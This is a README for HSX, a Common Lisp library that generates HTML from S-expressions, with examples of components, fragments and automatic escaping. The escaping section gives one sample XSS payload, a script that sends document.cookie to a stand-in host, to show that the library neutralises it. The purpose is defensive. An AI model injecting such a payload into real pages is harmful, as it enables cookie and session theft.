# HSX – Hypertext S-expression

**HSX** is a lightweight and expressive HTML generation library for Common Lisp, inspired by JSX. It allows you to write HTML using native Lisp syntax.

> 🚧 **ALPHA NOTICE:**  
> This library is still in early development. APIs may change.  
> See [release notes](https://github.com/skyizwhite/hsx/releases) for details.

## ⚙️ How HSX Works

Every tag or component inside an `(hsx ...)` form is transformed into a Lisp expression of the form:

```lisp
(create-element type props children)
```

For example:

```lisp
(hsx
  (article :class "container"
    (h1 "Title")
    (p "Paragraph")
    (~share-button :service :x))
```
Is internally transformed (by macro expansion) into:

```lisp
(create-element :article
                (list :class "container")
                (list (create-element :h1
                                      (list)
                                      (list "Title"))
                      (create-element :p
                                      (list)
                                      (list "Paragraph"))
                      (create-element #'~share-button
                                      (list :service :x)
                                      (list))))
```

This is made possible via the hsx macro, which detects HTML tags and components, then rewrites them using create-element. Tags are converted to keywords (e.g., div → :div), and custom components (starting with ~) are passed as functions.

## 🚀 Quick Example

```lisp
(hsx
  (div :id "main" :class "container"
    (h1 "Hello, HSX!")
    (p "This is a simple paragraph.")))
```

Generates:

```html
<div id="main" class="container">
  <h1>Hello, HSX!</h1>
  <p>This is a simple paragraph.</p>
</div>
```

## 📝 Rendering

Use `render-to-string` to convert an HSX structure to a string of HTML:

```lisp
(render-to-string
  (hsx ...))
``` 

## 🔐 Escaping text

All elements automatically escape special characters in content to prevent XSS and HTML injection:

```lisp
(hsx
  (div "<script>fetch('evilwebsite.com', { method: 'POST', body: document.cookie })</script>"))
```
Outputs:

```html
<div>&lt;script&gt;fetch(&#x27;evilwebsite.com&#x27;, { method: &#x27;POST&#x27;, body: document.cookie })&lt;&#x2F;script&gt;</div>
```

Use the special tag `raw!` to inject trusted, unescaped HTML:

```lisp
(hsx
  (article (raw! "HTML text here ..."))
```

## 🧩 Fragments

Use `<>` tag to group multiple sibling elements without wrapping them in a container tag:

```lisp
(hsx
  (<>
    (p "One")
    (p "Two")))
```

Outputs:

```html
<p>One</p>
<p>Two</p>
```

Note: `raw!` tag is a fragment that disables HTML escaping for its children.

## 🧱 Components

Define reusable components using `defcomp` macro. Component names must start with `~`.

*Keyword-style*

```lisp
(defcomp ~card (&key title children)
  (hsx
    (div :class "card"
      (h2 title)
      children)))
```

*Property-list style*

```lisp
(defcomp ~card (&rest props)
  (hsx
    (div :class "card"
      (h2 (getf props :title))
      (getf props :children))))
```

### Usage

```lisp
(hsx
  (~card :title "Hello"
    (p "This is a card.")))
```

Outputs:

```html
<div class="card">
  <h2>Hello</h2>
  <p>This is a card.</p>
</div>
```

## 🧬 Logic and Interpolation

You can freely embed Lisp expressions, conditionals, and loops inside HSX forms:

```lisp
(hsx
  (div
    (if (> (random 10) 5)
        (hsx (p "High!"))
        (hsx (p "Low!")))))
```

Or loop:

```lisp
(hsx
  (ul
    (loop :for item :in todo-list :collect
      (hsx (li item))))))
```

## 📄 License

MIT License

© 2024 Akira Tempaku

© 2018 Bo Yao (original [flute](https://github.com/ailisp/flute) project)
 
